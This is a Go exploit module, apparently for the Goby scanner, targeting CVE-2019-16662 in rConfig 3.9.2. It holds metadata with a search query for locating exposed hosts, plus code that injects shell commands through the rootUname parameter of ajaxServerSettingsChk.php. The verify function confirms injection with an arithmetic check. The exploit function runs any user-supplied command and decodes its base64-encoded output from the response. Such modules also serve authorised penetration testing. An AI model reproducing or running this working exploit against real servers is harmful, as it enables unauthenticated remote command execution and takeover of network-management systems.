package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "rConfig ajaxServerSettingsChk.php RCE(CVE-2019-16662)",
    "Description": "An issue was discovered in rConfig 3.9.2. An attacker can directly execute system commands by sending a GET request to ajaxServerSettingsChk.php because the rootUname parameter is passed to the exec function without filtering, which can lead to command execution.",
    "Impact": "rConfig ajaxServerSettingsChk.php RCE(CVE-2019-16662)",
    "Recommendation": "<p>Update the latest version</p>",
    "Product": "rConfig",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "rConfig 网络管理系统 ajaxServerSettingsChk 文件 命令执行漏洞(CVE-2019-16662)",
            "Description": "<p>rConfig 是一个开源网络设备配置管理实用程序。</p><p>rConfig 网络管理系统存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>rConfig 网络管理系统存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.rconfig.com/\">https://www.rconfig.com/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "rConfig",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "rConfig ajaxServerSettingsChk.php RCE(CVE-2019-16662)",
            "Description": "An issue was discovered in rConfig 3.9.2. An attacker can directly execute system commands by sending a GET request to ajaxServerSettingsChk.php because the rootUname parameter is passed to the exec function without filtering, which can lead to command execution.",
            "Impact": "rConfig ajaxServerSettingsChk.php RCE(CVE-2019-16662)",
            "Recommendation": "<p>Update the latest version</p>",
            "Product": "rConfig",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"rConfig\"",
    "GobyQuery": "body=\"rConfig\"",
    "Author": "corp0ra1@qq.com",
    "Homepage": "https://www.rconfig.com/",
    "DisclosureDate": "2021-07-15",
    "References": [
        "http://packetstormsecurity.com/files/154999/rConfig-3.9.2-Remote-Code-Execution.html",
        "http://packetstormsecurity.com/files/155186/rConfig-3.9.2-Command-Injection.html",
        "https://drive.google.com/file/d/1bTpTn4-alJ8qGCEATLq-oVM6HbhE65iY/view?usp=sharing",
        "https://drive.google.com/open?id=1OXI5cNuwWqc6y-7BgNCfYHgFPK2cpvnu",
        "https://gist.github.com/mhaskar/ceb65fa4ca57c3cdccc1edfe2390902e",
        "https://rconfig.com/download",
        "https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-16662",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16662"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2019-16662"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201910-1534"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "rConfig"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			vulUri := "/login.php"
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + vulUri); err == nil {
				version := regexp.MustCompile(`rConfig Version\s3.9.(\d)<span>`).FindStringSubmatch(resp.Utf8Html)[1]
				if version > "2" {
					return false
				}
			}
			checkStr1 := rand.Intn(100000)
			checkStr2 := rand.Intn(100000)
			path := fmt.Sprintf("/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%%3Bexpr%%20%d%%20%%2B%%20%d%%20%%20%%23", checkStr1, checkStr2)
			cfg := httpclient.NewPostRequestConfig(path)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, strconv.Itoa(checkStr1+checkStr2)) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cmd += "|base64 -w0"
			cmd = url.QueryEscape(cmd)
			path := fmt.Sprintf("/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%%3B%s%%20%%23", cmd)
			cfg := httpclient.NewPostRequestConfig(path)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if result := regexp.MustCompile(`The root details provided have not passed: (.*)<\\\/strong>`).FindStringSubmatch(resp.Utf8Html); len(result) > 1 {
					if decodeBytes, err := base64.StdEncoding.DecodeString(result[1]); result[1] != "" && err == nil {
						expResult.Success = true
						expResult.Output = string(decodeBytes)
					} else {
						expResult.Success = false
						expResult.Output = "Command execution failed"
					}
				}
			}
			return expResult
		},
	))
}
